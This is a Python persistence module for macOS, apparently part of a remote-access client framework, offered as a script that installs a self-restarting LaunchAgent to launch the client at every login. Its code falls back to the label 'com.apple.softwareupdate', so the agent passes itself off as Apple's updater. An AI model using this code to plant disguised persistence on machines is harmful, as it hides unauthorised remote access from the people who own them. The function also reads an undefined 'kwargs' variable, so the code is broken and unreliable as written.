SCRIPT_METADATA = {
    "name": "macos/persistence/launchagent",
    "display_name": "Manage LaunchAgent",
    "description": "Create, remove, or check status of a persistent LaunchAgent that runs at user login",
    "platforms": ["macos"],
    "category": "Persistence",
    "params": [
        {
            "name": "label",
            "type": "string",
            "required": False,
            "default": "com.rch.client",
            "description": "Unique identifier for the LaunchAgent"
        },
        {
            "name": "keep_alive",
            "type": "boolean",
            "required": False,
            "default": True,
            "description": "Automatically restart the agent if it exits"
        },
        {
            "name": "action",
            "type": "select",
            "required": False,
            "default": "status",
            "options": ["create", "remove", "status"],
            "description": "Action to perform on the LaunchAgent"
        },
        {
            "name": "scope",
            "type": "select",
            "required": False,
            "default": "user",
            "options": ["user", "global"],
            "description": "Install for current user only (~/Library) or all users (/Library)"
        }
    ]
}

import subprocess
import os
from client.runtime.client_util import get_executable_path


def manage_launchagent(script_path):
    label = kwargs.get('label', 'com.apple.softwareupdate')
    keep_alive = kwargs.get('keep_alive', True)
    action = kwargs.get('action', 'status')
    scope = kwargs.get('scope', 'user')

    # Determine plist path based on scope
    if scope == 'user':
        launch_agent_dir = os.path.expanduser('~/Library/LaunchAgents')
    else:
        launch_agent_dir = '/Library/LaunchAgents'

    plist_path = os.path.join(launch_agent_dir, f'{label}.plist')

    # Ensure directory exists
    if action == 'create':
        os.makedirs(launch_agent_dir, exist_ok=True)

    if action == 'status':
        if os.path.exists(plist_path):
            print(f'✓ Plist file exists: {plist_path}')
            result = subprocess.run(['launchctl', 'list', label], capture_output=True, text=True)
            if result.returncode == 0 and 'PID' in result.stdout:
                print(f'✓ Agent is loaded and running')
            else:
                print(f'✗ Agent is not loaded')
        else:
            print(f'✗ Agent not installed: {plist_path}')
        return

    if action == 'remove':
        subprocess.run(['launchctl', 'unload', plist_path], capture_output=True)
        if os.path.exists(plist_path):
            os.remove(plist_path)
            print(f'✓ Agent removed: {plist_path}')
        else:
            print(f'✗ Agent not found: {plist_path}')
        return

    # create action
    plist = {
        'Label': label,
        'ProgramArguments': ['/bin/sh', '-c', script_path],
        'RunAtLoad': True,
        'KeepAlive': keep_alive,
        'StandardOutPath': f'/tmp/{label}.out',
        'StandardErrorPath': f'/tmp/{label}.err'
    }

    import plistlib
    with open(plist_path, 'wb') as f:
        plistlib.dump(plist, f)

    subprocess.run(['launchctl', 'load', plist_path])
    print(f'✓ Agent created: {plist_path}')


manage_launchagent(get_executable_path())